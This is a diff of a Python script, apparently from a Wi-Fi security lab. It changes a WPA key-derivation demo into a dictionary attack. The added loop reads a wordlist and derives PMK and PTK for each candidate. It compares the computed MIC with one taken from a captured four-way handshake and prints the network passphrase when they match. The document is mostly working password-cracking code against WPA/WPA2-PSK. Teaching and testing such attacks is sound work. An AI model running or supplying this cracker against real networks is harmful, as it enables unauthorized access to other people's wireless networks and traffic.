@@ -113,7 +113,6 @@ def get_packet_layers(packet):
 
 
 # Important parameters for key derivation - most of them can be obtained from the pcap file
-passPhrase  = "actuelle"
 A           = "Pairwise key expansion" #this string is used in the pseudo-random function
 ssid        = findSSIDs(wpa)[0]
 APmac       = getAPMACs(wpa)[0]
@@ -134,31 +133,55 @@ data        = a2b_hex("0103005f02030a0000000000000000000100000000000000000000000
 
 print ("\n\nValues used to derivate keys")
 print ("============================")
-print ("Passphrase: ",passPhrase,"\n")
 print ("SSID: ",ssid,"\n")
 print ("AP Mac: ",b2a_hex(APmac),"\n")
 print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
 print ("AP Nonce: ",b2a_hex(ANonce),"\n")
 print ("Client Nonce: ",b2a_hex(SNonce),"\n")
 
-#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
-passPhrase = str.encode(passPhrase)
-ssid = str.encode(ssid)
-pmk = pbkdf2(hashlib.sha1,passPhrase, ssid, 4096, 32)
-
-#expand pmk to obtain PTK
-ptk = customPRF512(pmk,str.encode(A),B)
-
-#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
-mic = hmac.new(ptk[0:16],data,hashlib.sha1)
 
 
-print ("\nResults of the key expansion")
-print ("=============================")
-print ("PMK:\t\t",pmk.hex(),"\n")
-print ("PTK:\t\t",ptk.hex(),"\n")
-print ("KCK:\t\t",ptk[0:16].hex(),"\n")
-print ("KEK:\t\t",ptk[16:32].hex(),"\n")
-print ("TK:\t\t",ptk[32:48].hex(),"\n")
-print ("MICK:\t\t",ptk[48:64].hex(),"\n")
-print ("MIC:\t\t",mic.hexdigest(),"\n")
+wordlistFile = open("wordlist", "r")
+wordlist = wordlistFile.readlines()
+
+i = 0
+wordCount = len(wordlist)
+
+for word in wordlist:
+    word = word.strip()
+    #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    passPhrase = str.encode(word)
+    pmk = pbkdf2(hashlib.sha1,passPhrase, str.encode(ssid), 4096, 32)
+
+    #expand pmk to obtain PTK
+    ptk = customPRF512(pmk,str.encode(A),B)
+
+    #calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
+    mic = hmac.new(ptk[0:16],data,hashlib.sha1)
+
+    hexMic = mic.hexdigest()[:32]
+
+    #print ("\nTrying with passphrase:", word)
+    #print ("=========================" + '=' * len(word))
+
+    i+=1
+
+    if hexMic == mic_to_test.decode():
+        print ("!!! MIC Matching !!!\n")
+
+        print ("PMK:\t\t",pmk.hex(),"\n")
+        print ("PTK:\t\t",ptk.hex(),"\n")
+        print ("KCK:\t\t",ptk[0:16].hex(),"\n")
+        print ("KEK:\t\t",ptk[16:32].hex(),"\n")
+        print ("TK:\t\t",ptk[32:48].hex(),"\n")
+        print ("MICK:\t\t",ptk[48:64].hex(),"\n")
+        print ("MIC:\t\t",mic.hexdigest(),"\n")
+
+
+        print ("\n!!! The passphrase for", ssid, "is", word, "!!!\n\n")
+
+        break
+    else :
+        if i %30 == 0:
+            print("Progress:", i, "/", wordCount, "\t", round(i / wordCount * 100), "%\t", word)
+        #print ("MIC not Matching")
